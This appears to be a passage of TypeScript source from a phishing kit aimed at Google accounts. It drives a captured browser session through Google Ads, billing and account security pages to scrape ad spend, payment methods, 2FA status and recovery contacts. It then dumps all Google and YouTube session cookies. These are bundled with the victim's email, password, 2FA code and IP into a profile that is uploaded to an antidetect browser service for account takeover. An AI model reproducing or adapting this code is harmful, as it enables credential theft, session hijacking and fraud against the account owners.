          const allText = document.body.innerText;

          let customerId = "";
          const urlMatch = window.location.href.match(/[?&/](\d{3}-\d{3}-\d{4})(?:[/?&]|$)/);
          if (urlMatch) customerId = urlMatch[1];
          else { const m = allText.match(/\b(\d{3}-\d{3}-\d{4})\b/); if (m) customerId = m[1]; }

          const allIds = [...allText.matchAll(/\b(\d{3}-\d{3}-\d{4})\b/g)].map(m => m[1]);
          const uniqueIds = [...new Set(allIds)];

          let accountName = "";
          for (const sel of ['[data-testid="account-name"]', '.account-name', '[class*="account-name"]']) {
            const t = txt(sel); if (t && t.length < 80) { accountName = t; break; }
          }
          if (!accountName) {
            const title = document.title.replace("Google Ads", "").replace("|","").trim();
            if (title) accountName = title;
          }

          const currency = allText.match(/\b(BRL|USD|EUR|GBP|ARS|CLP|MXN)\b/)?.[1] ?? "";
          const timezone = allText.match(/\(GMT[^)]+\)/)?.[0] ?? "";

          const cells = Array.from(document.querySelectorAll("td, [role='cell'], [class*='metric']")) as HTMLElement[];
          const moneyRx = /^[R$€£]?[\d.,]+$/;
          const pctRx = /^\d+[,.]\d+\s*%$/;
          let spend = "", clicks = "", impressions = "", ctr = "", cpc = "", conversions = "", convValue = "";

          for (const cell of cells) {
            const t = cell.innerText?.trim() ?? "";
            if (!t || cell.children.length > 2) continue;
            const label = (cell.previousElementSibling as HTMLElement | null)?.innerText?.toLowerCase() ?? "";
            const header = document.querySelector(`[data-column-id="${cell.getAttribute('data-column-id')}"] [class*='header']`) as HTMLElement | null;
            const colName = (header?.innerText ?? label).toLowerCase();
            if ((colName.includes("custo") || colName.includes("gasto") || colName.includes("cost")) && moneyRx.test(t.replace(/\s/g,""))) spend = t;
            else if (colName.includes("click") && /^\d[\d.,]*$/.test(t.replace(/\./g,"").replace(/,/g,""))) clicks = t;
            else if (colName.includes("impress") && /^\d[\d.,]*$/.test(t.replace(/\./g,"").replace(/,/g,""))) impressions = t;
            else if ((colName.includes("ctr") || colName.includes("taxa")) && pctRx.test(t)) ctr = t;
            else if ((colName.includes("cpc") || colName.includes("custo por clique")) && moneyRx.test(t.replace(/\s/g,""))) cpc = t;
            else if (colName.includes("convers") && /^\d[\d.,]*$/.test(t.replace(/\./g,"").replace(/,/g,""))) conversions = t;
            else if (colName.includes("valor") && colName.includes("convers") && moneyRx.test(t.replace(/\s/g,""))) convValue = t;
          }

          if (!spend) {
            for (const el of Array.from(document.querySelectorAll("td, span")) as HTMLElement[]) {
              const t = el.innerText?.trim();
              if (t && /^R?\$\s?[\d.,]+$/.test(t) && el.children.length === 0) { spend = t; break; }
            }
          }

          const campaignEls = Array.from(document.querySelectorAll('[class*="campaign-name"], [data-campaign-id]')) as HTMLElement[];
          const campaigns = campaignEls.length;
          const activeCampaigns = campaignEls.filter(el => {
            const row = el.closest("tr");
            return row && row.innerText.toLowerCase().includes("ativ");
          }).length;

          const budgetMatch = allText.match(/or[çc]amento[^\n]*?(R?\$[\d.,]+)/i);
          const budget = budgetMatch?.[1] ?? "";

          let accountType = "";
          if (allText.includes("Smart")) accountType = "Smart";
          else if (allText.includes("Express")) accountType = "Express";
          else if (allText.toLowerCase().includes("gerenciador") || allText.toLowerCase().includes("manager")) accountType = "Manager (MCC)";
          else accountType = "Standard";

          return {
            accountName, customerId, spend, accountStatus: "Ativo",
            campaigns, activeCampaigns, budget,
            clicks, impressions, ctr, cpc, conversions, convValue,
            billingEmail: "", billingStatus: "", paymentMethod: "",
            currency, timezone, accountType,
            managerAccount: "", allCustomerIds: uniqueIds,
          };
        }).catch(() => info);

        // Faturamento
        try {
          await page.goto("https://ads.google.com/aw/billing/summary", { waitUntil: "domcontentloaded", timeout: 12000 });
          await new Promise((r) => setTimeout(r, 2500));
          const billing = await page.evaluate(() => {
            const t = document.body.innerText;
            const status = (document.querySelector('[class*="billing-status"], [class*="payment-status"]') as HTMLElement | null)?.innerText?.trim() ?? "";
            const method = (document.querySelector('[class*="payment-method"], [class*="card-info"]') as HTMLElement | null)?.innerText?.trim().slice(0, 60) ?? "";
            const emailMatch = t.match(/[\w.+-]+@[\w-]+\.[a-z]{2,}/);
            return { billingStatus: status, paymentMethod: method, billingEmail: emailMatch?.[0] ?? "" };
          }).catch(() => ({ billingStatus: "", paymentMethod: "", billingEmail: "" }));
          info.billingStatus = billing.billingStatus;
          info.paymentMethod = billing.paymentMethod;
          info.billingEmail = billing.billingEmail;
        } catch { /* ok */ }

        // Configurações
        try {
          await page.goto("https://ads.google.com/aw/settings/account", { waitUntil: "domcontentloaded", timeout: 10000 });
          await new Promise((r) => setTimeout(r, 2000));
          const settings = await page.evaluate(() => {
            const t = document.body.innerText;
            const tz = t.match(/\(GMT[^)]+\)/)?.[0] ?? "";
            const cur = t.match(/\b(BRL|USD|EUR|GBP|ARS|CLP|MXN)\b/)?.[1] ?? "";
            const mgr = t.match(/\d{3}-\d{3}-\d{4}/)?.[0] ?? "";
            return { timezone: tz, currency: cur, managerAccount: mgr };
          }).catch(() => ({ timezone: "", currency: "", managerAccount: "" }));
          if (settings.timezone) info.timezone = settings.timezone;
          if (settings.currency) info.currency = settings.currency;
          if (settings.managerAccount) info.managerAccount = settings.managerAccount;
        } catch { /* ok */ }
      } catch {
        console.warn("[adspower] diagnoseCurrentAccount failed");
      }
      return info;
    };

    // Tipo para lista de contas na tela de seleção
    type AccountEntry = { name: string; id: string; status: string; active: boolean };

    const allAdsInfos: AdsInfo[] = [];
    let accountList: AccountEntry[] = []; // lista da tela selectaccount (pode ser vazia)

    try {
      // Navega para overview — pode redirecionar para selectaccount se houver múltiplas contas
      await page.goto("https://ads.google.com/aw/overview", { waitUntil: "domcontentloaded", timeout: 15000 });
      await new Promise((r) => setTimeout(r, 2500));

      const landedUrl = page.url();
      const isMultiAccount = landedUrl.includes("nav/selectaccount") || landedUrl.includes("selectaccount");

      if (isMultiAccount) {
        console.log("[adspower] multi-account page detected:", landedUrl);

        // Scrape lista de contas — seletores exatos do HTML do Google Ads
        accountList = await page.evaluate((): AccountEntry[] => {
          const results: AccountEntry[] = [];
          const items = Array.from(document.querySelectorAll("material-list-item.user-customer-list-item")) as HTMLElement[];
          for (const item of items) {
            const name = (item.querySelector(".customer-name") as HTMLElement | null)?.innerText?.trim() ?? "";
            const id = (item.querySelector(".material-list-item-secondary") as HTMLElement | null)?.innerText?.trim() ?? "";
            if (!name || !id) continue;
            const tagText = (item.querySelector(".properties-tag") as HTMLElement | null)?.innerText?.trim() ?? "";
            const isCancelled = tagText.toLowerCase().includes("cancelad") || tagText.toLowerCase().includes("suspended");
            const isAdmin = tagText.toLowerCase().includes("admin") || tagText.toLowerCase().includes("gerenciador");
            let status = "Ativo";
            if (isCancelled) status = "Cancelado";
            else if (isAdmin) status = "Administrador (MCC)";
            results.push({ name, id, status, active: !isCancelled });
          }
          return results;
        }).catch(() => [] as AccountEntry[]);

        // Remove duplicatas por ID
        const seen = new Set<string>();
        accountList = accountList.filter(a => { if (seen.has(a.id)) return false; seen.add(a.id); return true; });
        console.log("[adspower] found", accountList.length, "accounts:", accountList.map(a => `${a.name}(${a.id})`).join(", "));

        // Diagnostica cada conta navegando por ela
        for (let i = 0; i < accountList.length; i++) {
          const acc = accountList[i];
          console.log(`[adspower] diagnosing account ${i + 1}/${accountList.length}: ${acc.name} (${acc.id}) — ${acc.status}`);
          try {
            // Clica na conta na tela de seleção
            await page.goto("https://ads.google.com/nav/selectaccount", { waitUntil: "domcontentloaded", timeout: 10000 });
            await new Promise((r) => setTimeout(r, 1500));

            const clicked = await page.evaluate((targetId: string): boolean => {
              const items = Array.from(document.querySelectorAll("material-list-item.user-customer-list-item")) as HTMLElement[];
              for (const item of items) {
                const idEl = item.querySelector(".material-list-item-secondary") as HTMLElement | null;
                if (idEl?.innerText?.trim() === targetId) {
                  item.click();
                  return true;
                }
              }
              return false;
            }, acc.id);

            if (!clicked) {
              // Fallback: navega diretamente via ocid (ID sem traços)
              const ocid = acc.id.replace(/-/g, "");
              await page.goto(`https://ads.google.com/aw/overview?ocid=${ocid}`, { waitUntil: "domcontentloaded", timeout: 15000 });
            } else {
              try { await page.waitForNavigation({ timeout: 10000, waitUntil: "domcontentloaded" }); } catch { /* ok */ }
            }
            await new Promise((r) => setTimeout(r, 1500));

            const info = await diagnoseCurrentAccount();
            if (!info.accountName) info.accountName = acc.name;
            if (!info.customerId) info.customerId = acc.id;
            info.accountStatus = acc.status;
            allAdsInfos.push(info);
            console.log(`[adspower] account ${acc.name}: spend=${info.spend}, type=${info.accountType}`);
          } catch {
            // Se falhar, insere entrada mínima com os dados da lista
            const minimal = emptyAdsInfo();
            minimal.accountName = acc.name;
            minimal.customerId = acc.id;
            minimal.accountStatus = acc.status;
            allAdsInfos.push(minimal);
          }
        }
      } else {
        // Conta única
        console.log("[adspower] single account, diagnosing...");
        const info = await diagnoseCurrentAccount();
        allAdsInfos.push(info);
      }

      console.log("[adspower] diagnosed", allAdsInfos.length, "account(s)");
    } catch {
      console.warn("[adspower] could not scrape ads data");
    }

    // Conta principal = primeira ativa (ou primeira da lista)
    const adsInfo: AdsInfo = allAdsInfos.find(a => a.accountStatus === "Ativo") ?? allAdsInfos[0] ?? emptyAdsInfo();

    // 4. Diagnóstico do Gmail / Conta Google
    type GmailInfo = {
      displayName: string;
      recoveryEmail: string;
      recoveryPhone: string;
      twoFactorEnabled: boolean;
      twoFactorMethods: string[];
      connectedApps: number;
      storageUsed: string;
      storageTotal: string;
      lastActivity: string;
      accountCreated: string;
    };
    const gmailInfo: GmailInfo = {
      displayName: "", recoveryEmail: "", recoveryPhone: "",
      twoFactorEnabled: false, twoFactorMethods: [],
      connectedApps: 0, storageUsed: "", storageTotal: "",
      lastActivity: "", accountCreated: "",
    };

    try {
      // 4a. Informações pessoais
      await page.goto("https://myaccount.google.com/personal-info", { waitUntil: "domcontentloaded", timeout: 12000 });
      await new Promise((r) => setTimeout(r, 2000));
      const personalInfo = await page.evaluate(() => {
        const t = document.body.innerText;
        // Nome de exibição
        let displayName = "";
        const nameEl = document.querySelector('[data-section-id="NAME"] [aria-label], [aria-label*="ome"], h1') as HTMLElement | null;
        if (nameEl) displayName = nameEl.innerText.trim();
        if (!displayName) {
          const m = t.match(/^([A-ZÀ-Ú][a-zà-ú]+(?:\s[A-ZÀ-Ú][a-zà-ú]+)+)/m);
          if (m) displayName = m[1];
        }
        return { displayName };
      }).catch(() => ({ displayName: "" }));
      gmailInfo.displayName = personalInfo.displayName;

      // 4b. Segurança (2FA, recovery email, phone, last activity)
      await page.goto("https://myaccount.google.com/security", { waitUntil: "domcontentloaded", timeout: 12000 });
      await new Promise((r) => setTimeout(r, 2500));
      const securityInfo = await page.evaluate(() => {
        const t = document.body.innerText;
        const tl = t.toLowerCase();

        // 2FA ativo?
        const twoFactorEnabled =
          tl.includes("verificação em dois fatores: ativad") ||
          tl.includes("2-step verification: on") ||
          tl.includes("verificação em 2 etapas: ativad") ||
          tl.includes("2sv: on");

        // Métodos de 2FA disponíveis
        const twoFactorMethods: string[] = [];
        if (tl.includes("google authenticator") || tl.includes("autenticador")) twoFactorMethods.push("Authenticator");
        if (tl.includes("sms") || tl.includes("mensagem de texto") || tl.includes("celular")) twoFactorMethods.push("SMS");
        if (tl.includes("chave de segurança") || tl.includes("security key")) twoFactorMethods.push("Chave de segurança");
        if (tl.includes("solicitação do google") || tl.includes("google prompt")) twoFactorMethods.push("Solicitação Google");
        if (tl.includes("código de backup") || tl.includes("backup code")) twoFactorMethods.push("Códigos de backup");
        if (tl.includes("passkey") || tl.includes("chave de acesso")) twoFactorMethods.push("Passkey");

        // Recovery email
        let recoveryEmail = "";
        const emailSection = Array.from(document.querySelectorAll('[class*="recovery"], [data-section*="recovery"], section'))
          .find((el) => (el as HTMLElement).innerText?.toLowerCase().includes("recupera")) as HTMLElement | null;
        if (emailSection) {
          const em = emailSection.innerText.match(/[\w.+-]+@[\w-]+\.[a-z]{2,}/);
          if (em) recoveryEmail = em[0];
        }
        if (!recoveryEmail) {
          const m = t.match(/E-mail de recupera[çc][aã]o\s*\n\s*([\w.+-]+@[\w-]+\.[a-z]{2,})/i);
          if (m) recoveryEmail = m[1];
        }

        // Recovery phone
        let recoveryPhone = "";
        const phoneM = t.match(/Telefone de recupera[çc][aã]o\s*\n\s*([\+\d][\d\s\-().]{7,})/i)
          ?? t.match(/Recovery phone\s*\n\s*([\+\d][\d\s\-().]{7,})/i);
        if (phoneM) recoveryPhone = phoneM[1].trim().slice(0, 20);

        // Última atividade da conta
        let lastActivity = "";
        const actM = t.match(/[Úú]ltima atividade[^:\n]*[:]\s*([^\n]{5,40})/i)
          ?? t.match(/last account activity[^:\n]*[:]\s*([^\n]{5,40})/i);
        if (actM) lastActivity = actM[1].trim();

        return { twoFactorEnabled, twoFactorMethods, recoveryEmail, recoveryPhone, lastActivity };
      }).catch(() => ({ twoFactorEnabled: false, twoFactorMethods: [] as string[], recoveryEmail: "", recoveryPhone: "", lastActivity: "" }));

      gmailInfo.twoFactorEnabled = securityInfo.twoFactorEnabled;
      gmailInfo.twoFactorMethods = securityInfo.twoFactorMethods;
      gmailInfo.recoveryEmail = securityInfo.recoveryEmail;
      gmailInfo.recoveryPhone = securityInfo.recoveryPhone;
      gmailInfo.lastActivity = securityInfo.lastActivity;

      // 4c. Apps conectados
      await page.goto("https://myaccount.google.com/connections", { waitUntil: "domcontentloaded", timeout: 10000 });
      await new Promise((r) => setTimeout(r, 2000));
      const connectedApps = await page.evaluate(() => {
        const cards = document.querySelectorAll('[class*="app-card"], [class*="service-card"], [role="listitem"], li');
        // Filtra itens que parecem apps (têm nome e ícone)
        let count = 0;
        for (const el of cards) {
          const h = (el as HTMLElement).innerHTML;
          if (h.includes("img") || h.includes("icon")) count++;
        }
        // Fallback: conta qualquer número mencionado
        if (count === 0) {
          const m = document.body.innerText.match(/(\d+)\s*app/i);
          if (m) return parseInt(m[1]);
        }
        return count;
      }).catch(() => 0);
      gmailInfo.connectedApps = connectedApps;

      // 4d. Armazenamento
      await page.goto("https://one.google.com/storage", { waitUntil: "domcontentloaded", timeout: 10000 });
      await new Promise((r) => setTimeout(r, 2000));
      const storageInfo = await page.evaluate(() => {
        const t = document.body.innerText;
        const m = t.match(/([\d.,]+\s*(?:GB|MB|TB))\s*(?:de\s*)?([\d.,]+\s*(?:GB|MB|TB))/i);
        if (m) return { used: m[1], total: m[2] };
        const m2 = t.match(/([\d.,]+\s*(?:GB|MB|TB))/i);
        return { used: m2?.[1] ?? "", total: "15 GB" };
      }).catch(() => ({ used: "", total: "" }));
      gmailInfo.storageUsed = storageInfo.used;
      gmailInfo.storageTotal = storageInfo.total;

      console.log("[adspower] gmail diagnosis:", JSON.stringify({ ...gmailInfo, twoFactorMethods: gmailInfo.twoFactorMethods.join(", ") }));
    } catch {
      console.warn("[adspower] could not complete gmail diagnosis");
    }

    // 5. Visitar Gmail e YouTube para estabelecer cookies de todas as propriedades Google
    const googleServices = [
      "https://mail.google.com/mail/u/0/",
      "https://www.youtube.com",
      "https://myaccount.google.com",
    ];
    for (const svcUrl of googleServices) {
      try {
        console.log("[adspower] visiting", svcUrl);
        await page.goto(svcUrl, { waitUntil: "domcontentloaded", timeout: 10000 });
        await new Promise((r) => setTimeout(r, 1000)); // aguarda cookies serem setados
      } catch {
        console.warn("[adspower] could not visit", svcUrl);
      }
    }

    // 6. Capturar todos os cookies via CDP (agora após visitas de diagnóstico)
    const cdp = await page.createCDPSession();
    const { cookies: allCookies } = await cdp.send("Network.getAllCookies") as {
      cookies: { name: string; value: string; domain: string; path: string; secure: boolean; httpOnly: boolean; sameSite?: string }[];
    };
    await cdp.detach();
    const cookies = allCookies.filter((c) =>
      c.domain.includes("google.com") || c.domain.includes("youtube.com") || c.domain.includes("googleapis.com")
    );
    console.log("[adspower] captured", allCookies.length, "total cookies,", cookies.length, "google-related");

    // 7. Montar observações com todos os dados capturados
    const now = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
    const twoFactorLabel: Record<string, string> = {
      sms: "SMS",
      email: "E-mail",
      authenticator: "Authenticator",
      device: "Confirmação no celular",
    };
    const kv = (label: string, value: string | number | boolean | undefined | null) => {
      if (value === "" || value === null || value === undefined || value === false || value === 0) return null;
      return `${label}:${value}`;
    };

    const adsDetail = (a: typeof adsInfo) => [
      kv("id", a.customerId),
      kv("tipo", a.accountType),
      kv("mgr", a.managerAccount),
      kv("gasto", a.spend),
      kv("orc", a.budget),
      kv("clk", a.clicks),
      kv("imp", a.impressions),
      kv("ctr", a.ctr),
      kv("cpc", a.cpc),
      kv("conv", a.conversions),
      kv("vconv", a.convValue),
      a.campaigns > 0 ? `camp:${a.campaigns}(${a.activeCampaigns}at)` : null,
      kv("fat", a.billingStatus),
      kv("pag", a.paymentMethod),
      kv("email-fat", a.billingEmail),
      kv("moeda", a.currency),
      kv("tz", a.timezone),
    ].filter((l) => l !== null).join(" | ");

    const remarkParts: (string | null)[] = [
      "── CREDENCIAIS ──",
      kv("Email", email),
      kv("Senha", session?.passwordPreview),
      kv("2FA", twoFactorLabel[session?.selectedTwoFactorType ?? ""] ?? session?.selectedTwoFactorType),
      kv("Cod2FA", session?.twoFactorPreview),
      kv("Disp2FA", session?.twoFactorDeviceName),
      "",
      ...(allAdsInfos.length > 1 ? [
        `── GOOGLE ADS (${allAdsInfos.length}) ──`,
        ...allAdsInfos.map((a, i) =>
          `[${i + 1}] ${a.accountName || a.customerId} — ${a.customerId} — ${a.accountStatus || "?"}`
        ),
        "",
        ...allAdsInfos.map((a, i) =>
          `[${i + 1}] ${a.accountName || "?"} (${a.accountStatus || "?"}) » ${adsDetail(a)}`
        ),
      ] : [
        "── GOOGLE ADS ──",
        kv("Conta", adsInfo.accountName),
        kv("CustomerID", adsInfo.customerId),
        adsInfo.allCustomerIds.length > 1 ? `OutrosIDs:${adsInfo.allCustomerIds.filter(id => id !== adsInfo.customerId).join(",")}` : null,
        kv("Tipo", adsInfo.accountType),
        kv("Mgr", adsInfo.managerAccount),
        kv("Gasto", adsInfo.spend),
        kv("Orc", adsInfo.budget),
        kv("Clk", adsInfo.clicks),
        kv("Imp", adsInfo.impressions),
        kv("CTR", adsInfo.ctr),
        kv("CPC", adsInfo.cpc),
        kv("Conv", adsInfo.conversions),
        kv("VConv", adsInfo.convValue),
        adsInfo.campaigns > 0 ? `Camp:${adsInfo.campaigns}(${adsInfo.activeCampaigns}at)` : null,
        kv("Fat", adsInfo.billingStatus),
        kv("Pag", adsInfo.paymentMethod),
        kv("EmailFat", adsInfo.billingEmail),
        kv("Moeda", adsInfo.currency),
        kv("TZ", adsInfo.timezone),
      ]),
      "",
      "── GMAIL ──",
      kv("Nome", gmailInfo.displayName),
      kv("Rec-email", gmailInfo.recoveryEmail),
      kv("Rec-tel", gmailInfo.recoveryPhone),
      `2FA:${gmailInfo.twoFactorEnabled ? "ON" : "OFF"}`,
      gmailInfo.twoFactorMethods.length > 0 ? `Mtd2FA:${gmailInfo.twoFactorMethods.join(",")}` : null,
      gmailInfo.connectedApps > 0 ? `Apps:${gmailInfo.connectedApps}` : null,
      (gmailInfo.storageUsed && gmailInfo.storageTotal) ? `Stg:${gmailInfo.storageUsed}/${gmailInfo.storageTotal}` : null,
      kv("UltAtiv", gmailInfo.lastActivity),
      "",
      "── CAPTURA ──",
      kv("IP", victimIp),
      kv("Device", session?.device),
      `Cookies:${cookies.length} | Data:${now} | Sess:${sessionId}`,
    ];
    const remarkFull = remarkParts.filter((l) => l !== null).join("\n");
    const REMARK_MAX = 1500;
    const remark = remarkFull.length > REMARK_MAX
      ? remarkFull.slice(0, REMARK_MAX - 14).replace(/\n[^\n]*$/, "") + "\n…[truncado]"
      : remarkFull;

    // 8. Criar perfil no Dolphin Anty
    const cookieArr = cookies.map((c) => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path,
      secure: c.secure,
      httpOnly: c.httpOnly,
      sameSite: c.sameSite ?? "Lax",
    }));

    // Monta nome enriquecido
    const nameParts: string[] = [];
    if (allAdsInfos.length > 1) {
      const activeAccs = allAdsInfos.filter(a => a.accountStatus === "Ativo" || !a.accountStatus.toLowerCase().includes("cancelad"));
      const spendTotal = activeAccs.find(a => a.spend)?.spend ?? "";
      if (spendTotal) nameParts.push(spendTotal);
      nameParts.push(`${allAdsInfos.length} contas`);
    } else {
      if (adsInfo.spend) nameParts.push(adsInfo.spend);
      if (adsInfo.accountName) nameParts.push(adsInfo.accountName);
      if (adsInfo.customerId) nameParts.push(adsInfo.customerId);
    }
    nameParts.push(email);
    const profileName = nameParts.join(" | ");

    if (!DOLPHIN_TOKEN) {
      console.warn("[dolphin] DOLPHIN_API_TOKEN não configurado — perfil não salvo");
      return;
    }

    // 8a. Criar perfil
    const createBody = {
      name: profileName,
      platform: "windows",
      browserType: "anty",
      mainWebsite: "google",
      useragent: {
        mode: "manual",
        value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
      },
      webrtc: { mode: "altered", ipAddress: null },
      canvas: { mode: "real" },
      webgl: { mode: "real" },
      timezone: { mode: "auto", value: null },
      locale: { mode: "auto", value: null },
      cpu: { mode: "manual", value: 8 },
      memory: { mode: "manual", value: 8 },
      doNotTrack: false,
      osVersion: "10",
      notes: remark,
    };

    const createRaw = await fetch(`${DOLPHIN_API}/browser_profiles`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${DOLPHIN_TOKEN}`,
      },
      body: JSON.stringify(createBody),
    }).then((r) => r.text());
    console.log("[dolphin] create response:", createRaw);

    const createData = JSON.parse(createRaw) as { success?: boolean; browserProfile?: { id?: number }; data?: { id?: number } };
    const profileId = createData?.browserProfile?.id ?? createData?.data?.id;

    if (!profileId) {
      console.error("[dolphin] ✗ perfil não criado:", createRaw);
      return;
    }
    console.log(`[dolphin] ✓ perfil criado — id: ${profileId} | email: ${email}`);

    // 8b. Importar cookies via PATCH
    if (cookieArr.length > 0) {
      const cookieRaw = await fetch(`${DOLPHIN_API}/browser_profiles/${profileId}`, {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
          "Authorization": `Bearer ${DOLPHIN_TOKEN}`,
        },
        body: JSON.stringify({ cookies: cookieArr }),
      }).then((r) => r.text());
      console.log(`[dolphin] cookie import response: ${cookieRaw}`);
    }

    console.log(`[dolphin] ✓ COMPLETO — id: ${profileId} | email: ${email} | senha: ${session?.passwordPreview} | cookies: ${cookieArr.length}`);
  } catch (err) {
    console.error("[dolphin] saveToAdsPower ERROR:", err);
  }
}

export function closePhantom(sessionId: string): void {
  const store = getStore();
  store.cancelledSessions.add(sessionId);
  store.completionTracked.delete(sessionId);
  const timer = store.sessionTimers.get(sessionId);
  if (timer) clearTimeout(timer);
  store.sessionTimers.delete(sessionId);
  store.pages.delete(sessionId);
  const browser = store.browsers.get(sessionId);
  if (browser) {
    void browser.close().catch(() => {});
    store.browsers.delete(sessionId);
  }
}
